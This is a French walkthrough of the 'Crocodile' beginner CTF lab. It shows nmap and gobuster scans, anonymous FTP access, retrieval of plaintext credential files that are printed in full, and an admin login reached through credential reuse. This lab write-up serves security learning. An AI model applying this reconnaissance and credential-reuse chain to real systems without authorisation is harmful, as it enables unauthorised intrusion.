
## 🎯 Objectif

La machine **Crocodile** est une machine Linux très facile basée sur plusieurs mauvaises configurations :

- FTP accessible anonymement
    
- Fichiers sensibles accessibles depuis le FTP
    
- Identifiants stockés en clair
    
- Page de connexion cachée sur le serveur web
    
- Réutilisation des identifiants pour accéder à l'administration
    

L'objectif est de trouver le flag en suivant le chemin :

**Reconnaissance → FTP anonyme → récupération des fichiers → découverte du login → connexion → flag**

---

## 1. 🔎 Reconnaissance avec Nmap

On commence par rechercher les ports et services ouverts :

```bash
nmap -sC -sV -p- 10.129.5.192
```

### À quoi servent les options ?

- `-p-` → scanne tous les ports
    
- `-sV` → détecte les versions des services
    
- `-sC` → lance les scripts Nmap par défaut
    

Cette étape permet notamment d'identifier les services accessibles sur la machine.

Dans Crocodile, les services importants sont notamment :

- **FTP** → port 21
    
- **HTTP** → port 80
    

On sait donc qu'il faut regarder à la fois le FTP et le site web.

---

## 2. 📁 Connexion au FTP en anonyme

L'énoncé indique qu'une authentification anonyme est possible.

On se connecte donc au FTP :

```bash
ftp 10.129.5.192
```

Puis :

```text
Name: anonymous
```

La connexion fonctionne :

```text
230 Login successful.
```

Cela signifie que le serveur FTP accepte un utilisateur anonyme.

---

## 3. 🔍 Énumération des fichiers FTP

Une fois connecté :

```bash
ls
```

On découvre deux fichiers :

```text
allowed.userlist
allowed.userlist.passwd
```

Il ne faut pas utiliser `cd` dessus car ce sont des **fichiers et non des dossiers**.

On les télécharge avec :

```bash
get allowed.userlist
get allowed.userlist.passwd
```

Puis on quitte le FTP :

```bash
bye
```

---

## 4. 📄 Lecture des fichiers récupérés

Les fichiers sont maintenant présents sur notre machine.

On peut lire leur contenu avec :

```bash
cat allowed.userlist
```

Puis :

```bash
cat allowed.userlist.passwd
```

On obtient deux listes.

### Liste des utilisateurs

```text
aron
pwnmeow
egotisticalsw
admin
```

### Liste des mots de passe

```text
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
```

Les deux fichiers semblent fonctionner par correspondance entre les lignes.

On peut donc associer les informations :

```text
aron             → root
pwnmeow          → Supersecretpassword1
egotisticalsw    → @BaASD&9032123sADS
admin             → rKXM59ESxesUFHAd
```

⚠️ Le problème de sécurité est important : les identifiants sont accessibles **en clair** depuis un FTP auquel n'importe qui peut se connecter anonymement.

---

## 5. 🌐 Énumération du site web

On sait maintenant que le port HTTP est ouvert.

On utilise **Gobuster** pour rechercher des fichiers et répertoires qui ne sont pas forcément visibles depuis la page principale.

```bash
gobuster dir -u http://10.129.5.192 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

### Explication

- `dir` → recherche des répertoires/fichiers
    
- `-u` → URL cible
    
- `-w` → wordlist utilisée
    
- `-x php,html,txt` → recherche également ces extensions
    

---

## 6. 🚪 Découverte de la page de connexion

Gobuster retourne plusieurs résultats intéressants.

Parmi eux :

```text
/dashboard     (Status: 301)
/login.php     (Status: 200)
/logout.php    (Status: 302)
```

Le résultat le plus intéressant est :

```text
/login.php
```

On ouvre donc :

```text
http://10.129.5.192/login.php
```

On découvre une page de connexion.

---

## 7. 🔐 Utilisation des identifiants trouvés

On réutilise les informations découvertes précédemment dans les fichiers FTP.

Pour le compte `admin` :

```text
Utilisateur : admin
Mot de passe : rKXM59ESxesUFHAd
```

La connexion fonctionne.

Cela montre la chaîne complète de vulnérabilités :

```text
FTP anonyme
     ↓
Fichiers accessibles
     ↓
Identifiants en clair
     ↓
Gobuster
     ↓
/login.php
     ↓
Réutilisation des identifiants
     ↓
Accès à l'administration
     ↓
🚩 FLAG
```